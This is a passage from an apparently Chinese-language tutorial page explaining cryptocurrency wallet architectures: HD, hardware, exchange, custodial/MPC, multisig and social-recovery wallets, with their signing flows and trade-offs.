用户体验</h2><ul><li><strong>便捷性</strong>：用户不需要管理私钥，只需记住账户和密码，使用起来相对简单。</li><li><strong>服务依赖</strong>：用户的资产安全和服务可用性高度依赖于中心化钱包的运营状况。</li></ul><h2 id="3-5-优势与劣势"><a href="#3-5-优势与劣势" class="headerlink" title="3.5 优势与劣势"></a>3.5 优势与劣势</h2><ul><li><strong>优势</strong>：操作简便，适合新手用户；交易速度快，服务响应及时。</li><li><strong>劣势</strong>：用户对资产的控制权较低；存在中心化服务的风险，如内部欺诈、黑客攻击等。</li></ul><h1 id="4-去中心化钱包-HD-钱包"><a href="#4-去中心化钱包-HD-钱包" class="headerlink" title="4. 去中心化钱包(HD 钱包)"></a>4. 去中心化钱包(HD 钱包)</h1><h2 id="4-1-去中心化钱包架构图"><a href="#4-1-去中心化钱包架构图" class="headerlink" title="4.1. 去中心化钱包架构图"></a>4.1. 去中心化钱包架构图</h2><p><img src="/img/web3/hdwallet.png" alt="hdwallet"></p><p>去中心化钱包的私钥是管理在用户设备中的，除了用户本人和牛逼的黑客，没有人接触得到。一般的去中心化钱包都是确定性分层钱包；先生成助记词，助记词导出主私钥，主私钥扩展子私钥和公钥的方式，公钥再导出地址。</p><p>去中心化钱包的私钥一般是加密之后存储在本地设备 sqlite 或者数据文件里面，当要签名交易的时候，需要用户输入密码解密私钥之后再签名。</p><p>去中心化钱包比较出名的有 Tp，ImToken，MetaMask 等，我们项目实战中将会带大家用 RN 开发一款类似 TP 的钱包。</p><h2 id="4-2-去中心化钱包细节业务流程"><a href="#4-2-去中心化钱包细节业务流程" class="headerlink" title="4.2.去中心化钱包细节业务流程"></a>4.2.去中心化钱包细节业务流程</h2><ul><li><p>离线地址生成</p><ul><li>助记词会编码加钱包密码，一般用sqlitle或者wallet.data文件</li><li>地址生成过程：chilldkey会有pubkey和prikey，pubkey会生成address，这个是离线的</li></ul></li><li><p>收款：查询本地设备数据库把地址展示到界面上。</p></li><li><p>查询余额：</p><ul><li><p>BTC是UTXO模型，链上没有rpc可以获得余额，需要electumX获取</p><p>ETH：eth get balances eth具备账户模型</p></li></ul></li></ul><p><img src="/img/web3/%E7%94%A8%E6%88%B7%E6%9F%A5%E8%AF%A2%E4%BD%99%E9%A2%9D%E6%B5%81%E7%A8%8B.jpg" alt="用户查询余额流程"></p><ul><li>转账<ul><li>第一步：检测余额是否足够</li><li>第二步：请求签名参数：<ul><li>ETH：获取三个：Nonce(Number once的缩写)、gasprice、 gaslimite </li><li>BTC：Version、Input、Output、Locktime、Sequence、Hash Type这些</li><li>Atom ：Account Number（唯一账户编号） Sequence（顺序）fess(手续费)</li></ul></li><li>第三步：组装交易，组装完之后生成一个32位的代签名的MsgHash</li><li>第四步：签名，用前面的Msghash和本地的privkey做一次sign签名，签名完成之后就会得到已经完成签名的<strong>报文</strong>，这个报文和pubkey组织完整的交易。</li><li>第五步：广播出去：上面的完整的交易调链上的接口广播出去，叫法不同：SendRawTransaction、PushTx、SendTx 、Broadcast</li></ul></li></ul><p><img src="/img/web3/%E7%A6%BB%E7%BA%BF%E7%AD%BE%E5%90%8D%E6%B5%81%E7%A8%8B%E5%9B%BE.jpg" alt="离线签名流程图"></p><ul><li><p>转账记录：根据地址查询交易记录和根据 Hash 查询交易详情,这笔转账是谁转给谁的</p></li><li><p>闪兑：钱包里面的闪兑一般对接 1inch 或者其他的 aggrator 实现兑换功能</p></li><li><p>Dapp 浏览器：Dapp 浏览器是指 Dapp 可以在里面运行，能够正常的和钱包进行交互，有以下几种主流的实现方式 Web View 中包裹 Dapp, 通过 Js 注入 Windows 对象的方式通信，一般钱包开发直接使用这种方式 Websocket 进行 Dapp 和钱包之间的通信</p></li></ul><blockquote><p>也称为非托管钱包，它允许用户完全控制自己的私钥和资金，而不需要依赖于第三方服务</p></blockquote><h2 id="4-3-核心总结点"><a href="#4-3-核心总结点" class="headerlink" title="4.3 核心总结点"></a>4.3 核心总结点</h2><ol><li><strong>私钥控制</strong>：用户完全控制自己的私钥，这是访问和转移加密货币的关键。</li><li><strong>非托管</strong>：没有中心化的实体持有用户的资产或私钥，用户对自己的资产有完全的控制权。</li><li><strong>确定性分层钱包（HD Wallet）</strong>：支持分层确定性钱包结构，可以从一个主种子（通常是助记词）生成多个地址。</li></ol><h2 id="4-4-架构和工作原理"><a href="#4-4-架构和工作原理" class="headerlink" title="4.4 架构和工作原理"></a>4.4 架构和工作原理</h2><ol><li><strong>本地存储</strong>：私钥通常存储在用户的设备上，如电脑、手机或专用硬件设备。</li><li><strong>加密保护</strong>：私钥在本地以加密形式存储，需要用户设置的密码或PIN码来解锁。</li><li><strong>签名交易</strong>：用户发起交易时，交易会在本地设备上使用私钥签名，然后广播到区块链网络。</li></ol><h2 id="4-5-类型"><a href="#4-5-类型" class="headerlink" title="4.5 类型"></a>4.5 类型</h2><ol><li><strong>软件钱包</strong>：安装在用户设备上的应用程序，如MetaMask、Keplr等。</li><li><strong>硬件钱包</strong>：专门的硬件设备，如Ledger和Trezor，它们在设备内部安全地存储私钥。</li><li><strong>纸钱包</strong>：将私钥和地址打印在纸上，是一种冷存储方式，但易受物理损害。</li></ol><h2 id="4-6-安全性"><a href="#4-6-安全性" class="headerlink" title="4.6 安全性"></a>4.6 安全性</h2><ol><li><strong>私钥安全</strong>：私钥的安全性完全取决于用户，需要妥善保管。</li><li><strong>加密保护</strong>：私钥在本地加密存储，增加了安全性。</li><li><strong>多签名</strong>：支持多签名钱包，需要多个私钥共同签名才能进行交易，提高了安全性。</li></ol><h2 id="4-7-用户体验"><a href="#4-7-用户体验" class="headerlink" title="4.7 用户体验"></a>4.7 用户体验</h2><ol><li><strong>控制权</strong>：用户对自己的资产有完全的控制权。</li><li><strong>隐私性</strong>：交易和余额信息不需要与任何中心化实体共享。</li><li><strong>技术门槛</strong>：相对于中心化钱包，去中心化钱包可能需要用户具备一定的技术知识。</li></ol><h2 id="4-8优势与劣势"><a href="#4-8优势与劣势" class="headerlink" title="4.8优势与劣势"></a>4.8优势与劣势</h2><ul><li><strong>优势</strong>：用户完全控制自己的资产；提高了安全性和隐私性；支持多种区块链资产。</li><li><strong>劣势</strong>：用户需要自己管理私钥，增加了责任；可能需要更高的技术知识；交易速度可能较慢。</li></ul><h1 id="5-硬件钱包"><a href="#5-硬件钱包" class="headerlink" title="5. 硬件钱包"></a>5. 硬件钱包</h1><h2 id="5-1-硬件钱包架构图"><a href="#5-1-硬件钱包架构图" class="headerlink" title="5.1. 硬件钱包架构图"></a>5.1. 硬件钱包架构图</h2><p><img src="/img/web3/hardware.png" alt="hardware"></p><p>硬件钱包主要是把私钥管理在离线的硬件设备中（可以是一个类似U遁的，也可以是一部手机或一台电脑），在硬件设备中集成钱包签名算法，一般使用蓝牙，NFC 或者串口通信进行通信。</p><p>硬件钱包一般有以下几个业务流程：</p><ul><li>地址生成：硬件中集成 BIP，生成助记词和密钥对，使用公钥导出钱包地址；</li><li>离线签名：组织交易生成 32 位的 Msg Hash, 将签名消息摘要传给硬件，硬件签名之后返回，组织交易发送到区块链网络。</li></ul><p>5.2. 硬件钱包细节业务流程</p><p>硬件钱包和去中心化钱包相比，最不相同是私有的管理方式，硬件钱包私钥和助记词管理在硬件中，下面离线地址生成和离线签名为例说明：</p><ul><li>离线地址生成：发不地址生成的指令给硬件，硬件会生成助记词和私钥等信息，并将私钥和助记词编码加密之后存储在硬件中，吐出公钥匙，钱包界面端用公钥匙生成地址。</li><li>离线签名：用户端组织编码交易报文，发送给硬件签名，签名回来的交易报文再次组织，然后发送到区块链网络。</li></ul><p>秘钥管理方式</p><p>你有一个硬件，硬件里面有签名芯片，还有存储、通信</p><p>通信主要是NFC、蓝牙、串口通信、来进行交易的报文传输去通信</p><p>比如你现在要签名一笔ETH的交易，你是要把ETH的整个交易组织了之后再生成一个32位的哈希消息传给你的硬件，你的硬件进行签名，签完名回来了之后你再组织报文去组织成完整的额交易，然后再发布到对应的ETH的网络上</p><p>签名：交易的签名，目前集成的签名算法有几种：ED2559、Secp256k1 r1 bls Schnorr</p><p>签名也分成几个步骤，一个是keying生成秘钥，把秘钥生成之后，私钥是在加密芯片里面，然后回吐出公钥来-》公钥推导出地址，然后你的地址就可以接受交易了，你要签名的时候，你整个交易报文组织好了，通信丢给签名芯片，通信完了之后再给你吐出出去，</p><blockquote><p>提供高安全性的加密货币存储解决方案专门设计的物理设备，用于生成、存储和管理私钥</p></blockquote><h2 id="5-3-核心特点"><a href="#5-3-核心特点" class="headerlink" title="5.3 核心特点"></a>5.3 核心特点</h2><ol><li><strong>离线存储</strong>：硬件钱包将<strong>私钥</strong>存储在设备的内部，与互联网隔离，减少了在线网络黑客的攻击风险</li><li><strong>冷存储</strong>：硬件钱包通常不连接到网络，只有在需要时与是被交互。冷也可以理解为运行的时候再变化，</li><li><strong>私钥生成</strong>：私钥在设备的内部生成，确保了私钥的随机性和安全性。</li><li><strong>用户控制</strong>：用户完全控制以硬件钱包中的私钥，没有第三方介入。</li></ol><h2 id="5-4-硬件钱包架构和工作原理"><a href="#5-4-硬件钱包架构和工作原理" class="headerlink" title="5.4 硬件钱包架构和工作原理"></a>5.4 硬件钱包架构和工作原理</h2><ol><li><strong>嵌入式系统</strong>：硬件钱包通常基于嵌入式系统，有限的硬件资源，专注于安全功能</li><li><strong>安全元件</strong>：实用专门的安全原件（如安全处理器或加密协同处理器）来保护私钥。</li><li><strong>用户界面</strong>：可能会配有小屏幕或按钮来供用户使用（将军令、网银U盾）</li><li><strong>通信接口</strong>：通过USB、蓝牙、NFC等接口与用户设备通信</li></ol><h2 id="5-5-主要功能"><a href="#5-5-主要功能" class="headerlink" title="5.5 主要功能"></a>5.5 主要功能</h2><ol><li><strong>地址生成</strong>：硬件钱包可以生成多个地址，通常遵循BIP32、BIP39等标准。</li><li><strong>交易签名</strong>：硬件钱包在设备内部对交易进行前面，确保私钥不会暴露给用户设备。</li><li><strong>备份与恢复</strong>：支持助记词或者种子短语备份，运行用户恢复钱包</li><li><strong>多签名支持</strong>：一些硬件钱包支持多签名交易，增加交易的安全性</li></ol><blockquote><p>BIP32和BIP39是两个与加密货币钱包相关的行业标准。</p><ol><li>BIP32（Hierarchical Deterministic Wallets）是一种标准，规定了从一个主私钥（Master Private Key）生成一系列相关的子私钥和对应的公钥的方法。它使用确定性的方式生成地址，这意味着可以从一个主私钥派生出一系列的子私钥和对应的地址，而不必为每个地址单独创建和备份私钥。这种层次结构的钱包可以更方便地管理和备份多个地址。</li><li>BIP39（Mnemonic Code for Generating Deterministic Keys）是另一个标准，定义了一种助记词或种子短语的生成方法。助记词是一组易于记忆和书写的单词，通常由12、15、18、21或24个单词组成。通过从一个固定的词汇表中选择这些单词，可以生成一个种子，该种子可以用于生成钱包的私钥和公钥。助记词提供了一种更方便和易于备份的方式来管理和恢复钱包，而不需要直接处理和备份私钥。</li></ol><p>这些标准的使用可以提高加密货币钱包的安全性和便利性。BIP32允许从一个主私钥生成多个地址，简化了钱包管理过程，并减少了私钥的暴露。BIP39的助记词提供了一种用户友好的备份和恢复机制，使用户能够通过记住一组单词来恢复整个钱包。</p></blockquote><h2 id="5-6-操作流程"><a href="#5-6-操作流程" class="headerlink" title="5.6 操作流程"></a>5.6 操作流程</h2><ol><li><strong>初始化</strong>：用户设置硬件钱包，生成新的种子短语，并妥善保存。</li><li><strong>接收资金</strong>：用户通过硬件钱包提供的公钥地址接收资金。</li><li><strong>发送交易</strong>：<ol><li>用户在计算机或者手机上创建交易请求</li><li>将交易详情传输到硬件钱包。</li><li>硬件钱包显示交易信息，用户确认无误后，通过按钮确认签名。</li><li>硬件钱包对交易进行签名，并将签名后的交易返回给用户设备。</li><li>用户将签名后的交易广播到区块链网络。</li></ol></li><li><strong>备份与恢复</strong>：在需要时，用户可以使用种子短语恢复钱包。</li></ol><h2 id="5-7-安全性"><a href="#5-7-安全性" class="headerlink" title="5.7 安全性"></a>5.7 安全性</h2><ol><li><strong>抵御网络攻击</strong>：由于私钥不接触网络，硬件钱包可以有效的抵御网络攻击</li><li>物理安全：硬件钱包的物理安全性取决于其构建质量和用户如何保管设备</li><li><strong>抗胁迫功能</strong>：一些硬件钱包提供虚假的PIN码或助记词，以防止在胁迫情况下泄露真实信息。</li></ol><h2 id="5-8-用户体验"><a href="#5-8-用户体验" class="headerlink" title="5.8 用户体验"></a>5.8 用户体验</h2><ol><li><strong>高安全性</strong>：未用户提供银行级别的资产保护</li><li>易用性： 尽管设置了安全措施，但大多数硬件钱包的设计都是友好用户的</li><li><strong>使用成本</strong>：硬件钱包需要找对应厂家购买，存在成本，据说贵的好几万U</li></ol><h2 id="5-9优势与劣势"><a href="#5-9优势与劣势" class="headerlink" title="5.9优势与劣势"></a>5.9优势与劣势</h2><ul><li><strong>优势</strong>：极高的安全性；私钥不触网；支持多种加密货币；易于使用。</li><li><strong>劣势</strong>：需要购买硬件设备；交易时需要物理设备；可能存在设备损坏或丢失的风险。</li></ul><h1 id="6-交易所Web3钱包"><a href="#6-交易所Web3钱包" class="headerlink" title="6.交易所Web3钱包"></a>6.交易所Web3钱包</h1><h2 id="6-1-核心特点"><a href="#6-1-核心特点" class="headerlink" title="6.1 核心特点"></a>6.1 核心特点</h2><ol><li><strong>集成性</strong>：作为交易所平台的一部分，用户可以直接在交易所内进行资产的存储、转账和交易。</li><li><strong>多功能</strong>：除了基本的钱包功能，还可能提供去中心化应用（DApp）的交互、代币交换、借贷等高级功能。</li><li><strong>用户界面</strong>：提供用户友好的界面，便于用户管理和使用其加密资产。</li></ol><h2 id="6-2架构和工作原理"><a href="#6-2架构和工作原理" class="headerlink" title="6.2架构和工作原理"></a>6.2架构和工作原理</h2><ol><li><strong>中心化管理</strong>：用户的私钥由交易所管理，这与中心化钱包相似，便于交易所进行快速的交易处理。</li><li><strong>去中心化交互</strong>：支持与区块链上的智能合约和DApp的交互，允许用户进行去中心化的交易和操作。</li><li><strong>热钱包与冷钱包</strong>：结合热钱包（在线钱包）和冷钱包（离线钱包）的使用，以提供安全性和便捷性的平衡。</li></ol><h2 id="6-3-主要功能"><a href="#6-3-主要功能" class="headerlink" title="6.3 主要功能"></a>6.3 主要功能</h2><ol><li><strong>资产管理</strong>：用户可以在钱包中查看和管理自己的加密货币资产。</li><li><strong>交易执行</strong>：用户可以直接在钱包界面上执行买卖订单。</li><li><strong>智能合约交互</strong>：支持与智能合约的交互，使用户能够参与到去中心化金融（DeFi）项目中。</li><li><strong>代币收发</strong>：用户可以发送和接收各种加密货币代币。</li><li><strong>多签支持</strong>：可能支持多签名钱包功能，增加交易的安全性。</li></ol><h2 id="6-4-操作流程"><a href="#6-4-操作流程" class="headerlink" title="6.4 操作流程"></a>6.4 操作流程</h2><ol><li><strong>账户创建</strong>：用户在交易所注册账户，并创建Web3钱包。</li><li><strong>私钥管理</strong>：私钥由交易所安全地管理，用户通过账户验证来访问钱包功能。</li><li><strong>资金存入</strong>：用户可以通过转账将加密货币存入交易所钱包。</li><li><strong>交易和投资</strong>：用户利用钱包内的资金进行市场交易或参与DeFi项目。</li><li><strong>资金提取</strong>：用户可以将资金从钱包提取到个人地址或其他钱包。</li></ol><h2 id="6-5-安全性"><a href="#6-5-安全性" class="headerlink" title="6.5 安全性"></a>6.5 安全性</h2><ol><li><strong>中心化风险</strong>：由于私钥由交易所管理，用户需要信任交易所的安全性和信誉。</li><li><strong>多重签名</strong>：一些交易所可能提供多重签名保护，增加交易的安全性。</li><li><strong>冷存储</strong>：交易所通常会将大部分资产存储在冷钱包中，以抵御网络攻击。</li></ol><h2 id="6-6-用户体验"><a href="#6-6-用户体验" class="headerlink" title="6.6 用户体验"></a>6.6 用户体验</h2><ol><li><strong>便捷性</strong>：用户可以在一个平台上完成交易和资产管理，无需在多个钱包间转移资金。</li><li><strong>功能丰富</strong>：提供多种金融功能，满足用户的不同需求。</li><li><strong>安全性</strong>：虽然不如硬件钱包安全，但通过多重签名和冷存储等措施提高了安全性。</li></ol><h2 id="6-7-优势与劣势"><a href="#6-7-优势与劣势" class="headerlink" title="6.7 优势与劣势"></a>6.7 优势与劣势</h2><ul><li><strong>优势</strong>：操作便捷，功能集成；用户界面友好；快速交易执行。</li><li><strong>劣势</strong>：中心化管理可能带来安全风险；用户对资产的控制权较低。</li></ul><h1 id="7-托管钱包"><a href="#7-托管钱包" class="headerlink" title="7. 托管钱包"></a>7. 托管钱包</h1><h2 id="7-1托管钱包架构图"><a href="#7-1托管钱包架构图" class="headerlink" title="7.1托管钱包架构图"></a>7.1托管钱包架构图</h2><p><img src="/img/web3/mpc.png" alt="mpc"></p><h2 id="7-2-托管钱包业务流程"><a href="#7-2-托管钱包业务流程" class="headerlink" title="7.2. 托管钱包业务流程"></a>7.2. 托管钱包业务流程</h2><p>托管钱包和其中心化钱包相比，不相同的地方也是密钥的管理方式，在托管系统中，一般使用 <strong>MPC 网络</strong>，一共有 M 个节点，其中 <strong>N 节点签名交易</strong>就有效。每个节点掌握一个密钥片，在整个网络中没有出现过完整的密钥；下面也地址生成和交易签名为例说明</p><ul><li>地址生成：业务端发出 Keygen 指令，MPC 网络经过多轮共识之后各自产生密钥片，并吐出聚合公钥，业务端使用公钥导出地址。</li><li>离线签名：业务端发出 Sign 指令, 并携带待签名的交易报文到 MPC 网络，MPC 网络经过多轮签名成公共，返回签名串给业务端，业务端将交易发送到区块链网络。</li><li>把钥匙分布在各个节点上，集齐七龙珠就可以召唤神龙</li></ul><h2 id="7-3-核心特点"><a href="#7-3-核心特点" class="headerlink" title="7.3 核心特点"></a>7.3 核心特点</h2><ol><li><strong>第三方管理</strong>：私钥由第三方机构管理，而不是用户直接控制。</li><li><strong>安全性高</strong>：通过专业的安全措施和协议来保护私钥，适用于存储大量资产。</li><li><strong>合规性</strong>：托管钱包服务的提供商通常要遵守当地的严格监管要求，包括KYC（了解你的用户）和AML（反洗钱）政策</li></ol><h2 id="7-4-工作原理"><a href="#7-4-工作原理" class="headerlink" title="7.4 工作原理"></a>7.4 工作原理</h2><ol><li><strong>多签名技术</strong>：托管钱包通常采用多签名技术，即需要<strong>多个签名者</strong>中的一定数量<strong>同意</strong>后才能授权交易。</li><li><strong>分层确定性钱包结构</strong>：支持分层确定性钱包（HD Wallet ），可以从一个种子短语生成多个地址。</li><li><strong>冷存储</strong>：私钥存储在离线环境中，如硬件安全模块（HSM）或冷库，以提高安全性</li></ol><h2 id="7-5-主要功能"><a href="#7-5-主要功能" class="headerlink" title="7.5 主要功能"></a>7.5 主要功能</h2><ol><li><strong>资产保管</strong>：为用户提供加密货币资产的保管服务。</li><li><strong>交易执行</strong>：用户可以<strong>发起交易</strong>请求，由<strong>托管服务执行</strong>实际的交易</li><li><strong>审计和报告</strong>：提供资产审计和交易报告服务，有助于合规性和透明度。</li><li><strong>风险管理</strong>：通过专业的风控措施，帮助用户管理资产风险。</li></ol><h2 id="7-6-操作流程"><a href="#7-6-操作流程" class="headerlink" title="7.6 操作流程"></a>7.6 操作流程</h2><ol><li><strong>注册和验证</strong>：用户在托管服务提供商处注册账户，并完成必要的身份验证。</li><li><strong>资产存入</strong>：用户将加密货币发送到托管钱包提供的地址。</li><li><strong>交易请求</strong>：用户通过托管服务的用户界面或API发起交易请求。</li><li><strong>交易执行</strong>：托管服务在验证用户请求后，执行交易并将结果通知用户。</li><li><strong>资产提取</strong>：用户可以请求将资产从托管钱包提取到指定地址。</li></ol><h2 id="7-7-安全性"><a href="#7-7-安全性" class="headerlink" title="7.7 安全性"></a>7.7 安全性</h2><ol><li><strong>专业安全措施</strong>：托管服务提供商采用高级的安全技术和协议，如SSL加密、多因素认证等。</li><li><strong>保险</strong>：一些托管服务为存储的资产提供保险，以覆盖潜在的安全事件造成的损失。</li><li><strong>合规性</strong>：遵循监管要求，定期进行安全审计和合规检查。</li></ol><h2 id="7-8-用户体验"><a href="#7-8-用户体验" class="headerlink" title="7.8 用户体验"></a>7.8 用户体验</h2><ol><li><strong>高安全性</strong>：为用户提供银行级别的资产保护。</li><li><strong>专业服务</strong>：提供专业的资产管理和交易执行服务。</li><li><strong>监管合规</strong>：帮助用户满足监管要求，降低合规风险。</li></ol><h2 id="7-9-优势与劣势"><a href="#7-9-优势与劣势" class="headerlink" title="7.9 优势与劣势"></a>7.9 优势与劣势</h2><ul><li><strong>优势</strong>：提供高安全性的资产保管；专业的管理和服务；帮助用户满足监管要求。</li><li><strong>劣势</strong>：用户需要支付服务费用；对资产的控制权较低；需要信任第三方机构的信誉和安全性。</li></ul><h1 id="8-多签钱包"><a href="#8-多签钱包" class="headerlink" title="8. 多签钱包"></a>8. 多签钱包</h1><p>多签钱包有点像 MPC 钱包的工作机制，但又完全不一样。 多签钱包的工作机制涉及多个密钥和 M-of-N 签名的概念。在 M-of-N 设置中，只有 N 个密钥中的 M 个对交易进行了签名，才能授权该交易。例如，在 2-of-3 多签钱包中，存在三个私钥，至少需要两个私钥才能授权交易。</p><p>关于 gnosis safe 多签钱包，在钱包章节我们不深入讲解，将会在后面的合约课程中深入讲解。</p><p>区别是 多签是多个私钥<br>mpc 是一个私钥多个分片</p><h2 id="8-1-核心特点"><a href="#8-1-核心特点" class="headerlink" title="8.1 核心特点"></a>8.1 核心特点</h2><ol><li><strong>多重签名</strong>：交易需要<strong>多个私钥</strong>中的至<strong>少M个</strong>签名才能被授权。</li><li><strong>提高安全性</strong>：减少了<strong>单点故障</strong>的风险，即使部分私钥<strong>泄露</strong>，资产仍然安全。</li><li><strong>灵活性</strong>：用户可以根据需要设置<strong>M和N</strong>的值，以及哪些私钥参与签名。</li></ol><h2 id="8-2-架构和工作原理"><a href="#8-2-架构和工作原理" class="headerlink" title="8.2 架构和工作原理"></a>8.2 架构和工作原理</h2><ol><li><strong>私钥生成</strong>：每个参与方生成自己的<strong>私钥</strong>，并保留好。</li><li><strong>公钥组合</strong>：所有参与方的<strong>公钥</strong>被<strong>组合</strong>在一起，用于生成钱包<strong>地址</strong>。</li><li><strong>交易签署</strong>：当需要发起交易时，必须收集到足够的签名<strong>（至少M个）</strong>才能进行。</li><li><strong>智能合约支持</strong>：多签钱包通常基于<strong>智能合约</strong>实现，特别是在<strong>以太坊</strong>等支持智能合约的上。</li></ol><h2 id="8-3-主要功能"><a href="#8-3-主要功能" class="headerlink" title="8.3 主要功能"></a>8.3 主要功能</h2><ol><li><strong>资产共享管理</strong>：多个用户可以<strong>共同管理</strong>钱包中的资产。</li><li><strong>交易授权</strong>：交易需要<strong>多个签名</strong>，增加了交易的<strong>安全性</strong>。</li><li><strong>权限分配</strong>：可以根据需要分配不同的<strong>权限</strong>给不同的<strong>私钥持有者</strong>。</li><li><strong>审计和追踪</strong>：所有交易都需要多个签名，易于审计和追踪。</li></ol><h2 id="8-4-操作流程"><a href="#8-4-操作流程" class="headerlink" title="8.4 操作流程"></a>8.4 操作流程</h2><ol><li><strong>创建钱包</strong>：创建多签钱包时，需要确定<strong>M和N</strong>的值，以及参与方的<strong>公钥</strong>。</li><li><strong>生成私钥</strong>：每个参与方生成自己的<strong>私钥</strong>，并妥善保管。</li><li><strong>发起交易</strong>：一个参与方发起交易请求，但交易尚未<strong>最终授权</strong>。</li><li><strong>收集签名</strong>：交易请求被发送给其他参与方，他们用自己的私钥<strong>签署</strong>交易。</li><li><strong>交易执行</strong>：收集到足够的签名后，交易被<strong>广播</strong>到区块链网络并执行。</li></ol><h2 id="8-5-安全性"><a href="#8-5-安全性" class="headerlink" title="8.5 安全性"></a>8.5 安全性</h2><ol><li><strong>抗胁迫</strong>：即使<strong>一个私钥持有者受到胁迫</strong>，也无法单独授权交易。</li><li><strong>抗攻击</strong>：需要<strong>多个签名</strong>才能交易，增加了攻击者盗取资产的<strong>难度</strong>。</li><li><strong>私钥分散</strong>：私钥<strong>分散</strong>在多个参与方手中，<strong>减少</strong>了私钥集中泄露的风险。</li></ol><h2 id="8-6-用户体验"><a href="#8-6-用户体验" class="headerlink" title="8.6 用户体验"></a>8.6 用户体验</h2><ol><li><strong>安全性高</strong>：适合需要<strong>高安全级别</strong>的用户和<strong>组织</strong>。</li><li><strong>操作复杂性</strong>：相比于单签名钱包，多签钱包的操作更为复杂。</li><li><strong>协作需求</strong>：需要参与方之间的协作来签署和执行交易。</li></ol><h2 id="8-7-优势与劣势"><a href="#8-7-优势与劣势" class="headerlink" title="8.7 优势与劣势"></a>8.7 优势与劣势</h2><ul><li><strong>优势</strong>：提高了安全性和抗风险能力；适合共同管理资产；易于<strong>审计</strong>和<strong>追踪</strong>。</li><li><strong>劣势</strong>：操作过程可能较为繁琐；需要多个参与方的协作；可能存在<strong>协调</strong>困难。</li></ul><h1 id="9-MPC钱包"><a href="#9-MPC钱包" class="headerlink" title="9.MPC钱包"></a>9.MPC钱包</h1><blockquote><p>（MPC，Multi-Party Computation），一个完整的私钥被分割多个部分，每个部分由不同的参与方持有。</p></blockquote><h2 id="9-1-核心特点"><a href="#9-1-核心特点" class="headerlink" title="9.1 核心特点"></a>9.1 核心特点</h2><ol><li><strong>去中心化控制</strong>：私钥以<strong>分割</strong>的形式存在，没有<strong>单一实体</strong>能够单独控制私钥。</li><li><strong>增强安全性</strong>：私钥的每个部分单独不具有<strong>价值</strong>，只有组合一<strong>定数量</strong>的部分才能<strong>恢复私钥</strong>。</li><li><strong>多方授权</strong>：需要<strong>多个参与者</strong>的份额共同协作才能<strong>授权</strong>和<strong>签署</strong>交易。</li></ol><h2 id="9-2-架构和工作原理"><a href="#9-2-架构和工作原理" class="headerlink" title="9.2 架构和工作原理"></a>9.2 架构和工作原理</h2><ol><li><strong>秘密分割</strong>：私钥通过<strong>秘密共享算法</strong>被分割成多个份额，每个<strong>份额</strong>包含<strong>私钥</strong>的一部分信息。</li><li><strong>份额分布</strong>：这些份额被<strong>分发</strong>给不同的参与者，可以是不同的个人、服务器或地理位置。</li><li><strong>阈值设置</strong>：设置一个<strong>阈值</strong>（通常是<strong>N个中的M个</strong>），只有收集到<strong>M个份额时才能恢复私钥</strong>。</li><li><strong>交易签署</strong>：当需要签署交易时，所有参与者必须<strong>协作</strong>，提供他们的份额以生成签名。</li></ol><h2 id="9-3-主要功能"><a href="#9-3-主要功能" class="headerlink" title="9.3 主要功能"></a>9.3 主要功能</h2><ol><li><strong>资产保护</strong>：即使部分份额<strong>丢失</strong>或被盗，只要没有达到<strong>阈值</strong>，资产仍然安全。</li><li><strong>抗胁迫</strong>：单个参与者无法被<strong>胁迫</strong>透露私钥信息，因为他们不拥有<strong>完整</strong>的私钥。</li><li><strong>容错性</strong>：即使一些份额丢失或损坏，只要有足够的份额，私钥仍然可以被<strong>恢复</strong>。</li><li><strong>审计和合规</strong>：所有交易都需要多个签名，便于审计和满足合规要求。</li></ol><h2 id="9-4-操作流程"><a href="#9-4-操作流程" class="headerlink" title="9.4 操作流程"></a>9.4 操作流程</h2><ol><li><strong>初始化钱包</strong>：创建MPC钱包时，私钥被<strong>分割</strong>成多个份额，并分配给不同的参与者。</li><li><strong>份额存储</strong>：每个参与者安全地存储他们的份额，可能使用硬件**安全模块(**HSM)或其他安全措施。</li><li><strong>交易请求</strong>：用户发起交易请求，需要多个份额来<strong>授权</strong>。</li><li><strong>份额收集</strong>：协调者或智能合约收集足够的份额以<strong>重构</strong>私钥。</li><li><strong>签名交易</strong>：使用<strong>重构</strong>的私钥对交易进行<strong>签名</strong>。</li><li><strong>执行交易</strong>：将签名后的<strong>交易</strong>广播到区块链网络。</li></ol><h2 id="9-5-安全性"><a href="#9-5-安全性" class="headerlink" title="9.5 安全性"></a>9.5 安全性</h2><ol><li><strong>抗盗取</strong>：没有单一实体拥有<strong>完整</strong>的私钥，增加了<strong>盗取</strong>资产的难度。</li><li><strong>抗内部欺诈</strong>：需要多个参与者的协作才能进行<strong>交易</strong>，减少了<strong>内部欺诈</strong>的风险。</li><li><strong>抗胁迫</strong>：单个参与者即使在胁迫下也<strong>无法泄露</strong>完整私钥。</li></ol><h2 id="9-6-用户体验"><a href="#9-6-用户体验" class="headerlink" title="9.6 用户体验"></a>9.6 用户体验</h2><ol><li><strong>高安全性</strong>：用户可以放心地保管资产，因为私钥的<strong>安全性</strong>得到了显著提升。</li><li><strong>操作复杂性</strong>：相比于传统钱包，MPC钱包的操作可能更加复杂，<strong>需要协调多个</strong>参与者。</li><li><strong>信任和协作</strong>：需要在参与者之间建立信任和<strong>协作</strong>机制。</li></ol><h2 id="9-7-优势与劣势"><a href="#9-7-优势与劣势" class="headerlink" title="9.7 优势与劣势"></a>9.7 优势与劣势</h2><ul><li><strong>优势</strong>：提供了极高的<strong>安全性</strong>；适合需要严格<strong>合规</strong>的场合；增强了对资产的保护。</li><li><strong>劣势</strong>：操作过程可能较为复杂；需要多个参与者的<strong>协作</strong>；可能涉及较高的协调成本。</li></ul><h1 id="10-社交恢复钱包-2种恢复方式"><a href="#10-社交恢复钱包-2种恢复方式" class="headerlink" title="10. 社交恢复钱包(2种恢复方式)"></a>10. 社交恢复钱包(2种恢复方式)</h1><p>社交恢复钱包现在是属于不流行阶段，其使用门槛稍微高了一些，而且现有的社交恢复的技术解决方案不够完美，这也是社交恢复钱包直到今天为止做得不太好的原因。</p><h2 id="10-1-守护者恢复"><a href="#10-1-守护者恢复" class="headerlink" title="10-1 守护者恢复"></a>10-1 守护者恢复</h2><p>守护者恢复是使用合约的方式来实现的，用户的钱包是一个合约钱包，由一个 EOA 地址控制；用户可以给这个钱包设置 <strong>N 个守护者</strong>，当用户的私钥<strong>丢失</strong>时，可以让这些守护者<strong>联合签名</strong>一个交易替换这个合约钱包的 <strong>owner</strong>。</p><p><img src="/img/web3/protector.png" 